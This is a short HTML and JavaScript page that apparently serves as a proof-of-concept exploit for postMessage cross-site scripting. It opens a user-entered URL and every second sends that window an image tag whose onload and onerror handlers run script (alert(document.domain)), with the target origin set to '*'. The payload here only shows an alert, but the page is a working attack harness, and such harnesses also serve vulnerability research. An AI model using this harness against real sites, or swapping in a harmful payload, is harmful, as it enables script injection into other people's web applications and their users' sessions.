<input type="text" name="url">

<script>
	document.addEventListener('keydown', function (event) {
		if (event.keyCode === 13) {
			const targetURL = event.target.value;

			const targetWindow = window.open(targetURL);

			setInterval(() => {
				targetWindow.postMessage(`<img src="#thor-was-is-was-isn't-not-here" onload="alert(document.domain)" onerror="alert(document.domain)"/>`, "*");
			}, 1000);
		}
	});
</script>
